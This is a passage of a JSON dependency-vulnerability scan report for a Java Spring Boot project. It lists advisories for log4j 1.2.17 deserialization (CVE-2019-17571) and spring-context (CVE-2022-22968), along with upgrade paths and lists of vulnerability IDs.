        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-01-18T17:28:19Z",
        "references": [
          {
            "title": "Apache Mailing List",
            "url": "https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w"
          },
          {
            "title": "Apache Security Advisory",
            "url": "https://logging.apache.org/log4j/1.2/index.html"
          },
          {
            "title": "Reload4j Fix Commit",
            "url": "https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9"
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "severity": "high",
        "socialTrendAlert": false,
        "title": "Deserialization of Untrusted Data",
        "from": [
          "com.canh:JavaSpring@1.0-SNAPSHOT",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.17",
        "severityWithCritical": "high"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
        "alternativeIds": [],
        "creationTime": "2020-06-18T15:47:31.144561Z",
        "credit": [
          "Marcio Almeida de Macedo"
        ],
        "cvssScore": 9.8,
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E)\n- [PoC](https://0xsapra.github.io/website/CVE-2019-17571)\n",
        "disclosureTime": "2019-12-22T09:33:11Z",
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "functions": [
          {
            "functionId": {
              "className": "SocketServer",
              "filePath": "org/apache/log4j/net/SocketServer.java",
              "functionName": "main"
            },
            "version": [
              "[0,]"
            ]
          }
        ],
        "functions_new": [
          {
            "functionId": {
              "className": "org.apache.log4j.net.SocketServer",
              "functionName": "main"
            },
            "version": [
              "[0,]"
            ]
          }
        ],
        "id": "SNYK-JAVA-LOG4J-572732",
        "identifiers": {
          "CVE": [
            "CVE-2019-17571"
          ],
          "CWE": [
            "CWE-502"
          ],
          "GHSA": [
            "GHSA-2qrg-x229-3v8q"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "log4j",
          "groupId": "log4j"
        },
        "modificationTime": "2022-02-11T15:25:01.017358Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2020-06-19T09:33:01Z",
        "references": [
          {
            "title": "Apache Security Advisory",
            "url": "https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E"
          },
          {
            "title": "PoC",
            "url": "https://0xsapra.github.io/website/CVE-2019-17571"
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "severity": "critical",
        "socialTrendAlert": false,
        "title": "Deserialization of Untrusted Data",
        "from": [
          "com.canh:JavaSpring@1.0-SNAPSHOT",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.17",
        "severityWithCritical": "critical"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
        "alternativeIds": [],
        "creationTime": "2022-04-14T11:54:10.207823Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 3.7,
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Handling of Case Sensitivity via the patterns for `disallowedFields` on a `DataBinder`. As a result, a field is not effectively protected unless it is listed with both upper and lower case for the first character of the field, including nested fields within the property path.\n## Remediation\nUpgrade `org.springframework:spring-context` to version 5.2.21, 5.3.19 or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/833e750175349ab4fd502109a8b41af77e25cdea)\n- [GitHub Issue](https://github.com/spring-projects/spring-framework/issues/28333)\n- [Spring Blog Post](https://spring.io/blog/2022/04/13/spring-framework-data-binding-rules-vulnerability-cve-2022-22968)\n- [Tanzu Advisory](https://tanzu.vmware.com/security/cve-2022-22968)\n",
        "disclosureTime": "2022-04-14T11:43:54Z",
        "exploit": "Not Defined",
        "fixedIn": [
          "5.2.21",
          "5.3.19"
        ],
        "functions": [],
        "functions_new": [],
        "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2689634",
        "identifiers": {
          "CVE": [
            "CVE-2022-22968"
          ],
          "CWE": [
            "CWE-178"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "spring-context",
          "groupId": "org.springframework"
        },
        "modificationTime": "2022-04-14T12:09:40.109582Z",
        "moduleName": "org.springframework:spring-context",
        "packageManager": "maven",
        "packageName": "org.springframework:spring-context",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-04-14T12:09:40.107275Z",
        "references": [
          {
            "title": "GitHub Commit",
            "url": "https://github.com/spring-projects/spring-framework/commit/833e750175349ab4fd502109a8b41af77e25cdea"
          },
          {
            "title": "GitHub Issue",
            "url": "https://github.com/spring-projects/spring-framework/issues/28333"
          },
          {
            "title": "Spring Blog Post",
            "url": "https://spring.io/blog/2022/04/13/spring-framework-data-binding-rules-vulnerability-cve-2022-22968"
          },
          {
            "title": "Tanzu Advisory",
            "url": "https://tanzu.vmware.com/security/cve-2022-22968"
          }
        ],
        "semver": {
          "vulnerable": [
            "[,5.2.21)",
            "[5.3.0, 5.3.19)"
          ]
        },
        "severity": "low",
        "socialTrendAlert": false,
        "title": "Improper Handling of Case Sensitivity",
        "from": [
          "com.canh:JavaSpring@1.0-SNAPSHOT",
          "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
          "org.springframework:spring-web@4.2.4.RELEASE",
          "org.springframework:spring-context@4.2.4.RELEASE"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "org.springframework:spring-context",
        "version": "4.2.4.RELEASE",
        "severityWithCritical": "low"
      }
    ],
    "upgrade": {
      "io.springfox:springfox-swagger-ui@2.2.2": {
        "upgradeTo": "io.springfox:springfox-swagger-ui@2.10.0",
        "upgrades": [
          "io.springfox:springfox-swagger-ui@2.2.2"
        ],
        "vulns": [
          "SNYK-JAVA-IOSPRINGFOX-1075064"
        ]
      },
      "io.springfox:springfox-swagger2@2.2.2": {
        "upgradeTo": "io.springfox:springfox-swagger2@2.10.0",
        "upgrades": [
          "com.google.guava:guava@18.0",
          "com.google.guava:guava@18.0"
        ],
        "vulns": [
          "SNYK-JAVA-COMGOOGLEGUAVA-1015415",
          "SNYK-JAVA-COMGOOGLEGUAVA-32236"
        ]
      },
      "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE": {
        "upgradeTo": "org.springframework.boot:spring-boot-starter-web@2.5.12",
        "upgrades": [
          "org.springframework:spring-beans@4.2.4.RELEASE",
          "org.springframework:spring-expression@4.2.4.RELEASE",
          "org.springframework:spring-core@4.2.4.RELEASE",
          "ch.qos.logback:logback-core@1.1.3",
          "org.springframework:spring-core@4.2.4.RELEASE",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "org.yaml:snakeyaml@1.16",
          "org.springframework.boot:spring-boot@1.3.1.RELEASE",
          "org.springframework:spring-web@4.2.4.RELEASE",
          "ch.qos.logback:logback-classic@1.1.3",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "org.springframework:spring-web@4.2.4.RELEASE",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "org.springframework:spring-webmvc@4.2.4.RELEASE",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "ch.qos.logback:logback-core@1.1.3",
          "com.fasterxml.jackson.core:jackson-core@2.6.4",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "org.springframework:spring-webmvc@4.2.4.RELEASE",
          "com.fasterxml.jackson.core:jackson-databind@2.6.4",
          "com.fasterxml.jackson.core:jackson-core@2.6.4",
          "org.hibernate:hibernate-validator@5.2.2.Final",
          "org.hibernate:hibernate-validator@5.2.2.Final",
          "org.hibernate:hibernate-validator@5.2.2.Final",
          "org.springframework:spring-webmvc@4.2.4.RELEASE",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30",
          "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
        ],
        "vulns": [
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-2436751",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-2434828",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-2330878",
          "SNYK-JAVA-CHQOSLOGBACK-1726923",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-2329097",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-1728264",
          "SNYK-JAVA-ORGYAML-537645",
          "SNYK-JAVA-ORGSPRINGFRAMEWORKBOOT-2438287",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-1009832",
          "SNYK-JAVA-CHQOSLOGBACK-31407",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1009829",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1047324",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1052449",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1052450",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1054588",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056414",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056416",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056417",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056418",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056419",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056420",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056421",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056424",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056425",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056426",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056427",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1061931",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-174736",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-2421244",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-450207",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-455617",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-467014",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-467015",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-467016",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-469674",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-469676",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-471943",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-472980",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-540500",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-548451",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-559094",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-559106",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-560762",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-560766",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561362",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561373",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561585",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561586",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561587",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-564887",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-564888",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-570625",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-572300",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-572314",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-572316",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-608664",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72448",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72449",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72450",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72451",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72882",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72883",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72884",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-72470",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-451505",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-451508",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72445",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72446",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72447",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-32043",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-32044",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-32111",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-451510",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-451511",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-32202",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-451515",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-31573",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-451519",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-31420",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-31432",
          "SNYK-JAVA-CHQOSLOGBACK-30208",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-31519",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-451521",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-451526",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-31332",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1048302",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-31520",
          "SNYK-JAVA-ORGHIBERNATE-451605",
          "SNYK-JAVA-ORGHIBERNATE-568162",
          "SNYK-JAVA-ORGHIBERNATE-569100",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-536316",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-30988",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-451527",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-451529",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-451531",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-30986",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-30987",
          "SNYK-JAVA-ORGAPACHETOMCATEMBED-30989"
        ]
      },
      "org.webjars:bootstrap@3.3.6": {
        "upgradeTo": "org.webjars:bootstrap@4.5.0",
        "upgrades": [
          "org.webjars:jquery@1.11.1",
          "org.webjars:jquery@1.11.1",
          "org.webjars:jquery@1.11.1",
          "org.webjars:jquery@1.11.1",
          "org.webjars:bootstrap@3.3.6",
          "org.webjars:bootstrap@3.3.6",
          "org.webjars:bootstrap@3.3.6",
          "org.webjars:bootstrap@3.3.6",
          "org.webjars:bootstrap@3.3.6"
        ],
        "vulns": [
          "SNYK-JAVA-ORGWEBJARS-565171",
          "SNYK-JAVA-ORGWEBJARS-567882",
          "SNYK-JAVA-ORGWEBJARS-479774",
          "SNYK-JAVA-ORGWEBJARS-479782",
          "SNYK-JAVA-ORGWEBJARS-451160",
          "SNYK-JAVA-ORGWEBJARS-451162",
          "SNYK-JAVA-ORGWEBJARS-451164",
          "SNYK-JAVA-ORGWEBJARS-451168",
          "SNYK-JAVA-ORGWEBJARS-479505"
        ]
      }
    },
    "patch": {},
    "ignore": {},
    "pin": {}
  },
  "filesystemPolicy": false,
  "filtered": {
    "ignore": [],
    "patch": []
  },
  "uniqueCount": 119,
  "projectName": "com.canh:JavaSpring",
  "displayTargetFile": "pom.xml",
  "path": "/home/thuan/SASTool_worker/media/documents/2022/04/13/JavaSpringBootExample-master"
}
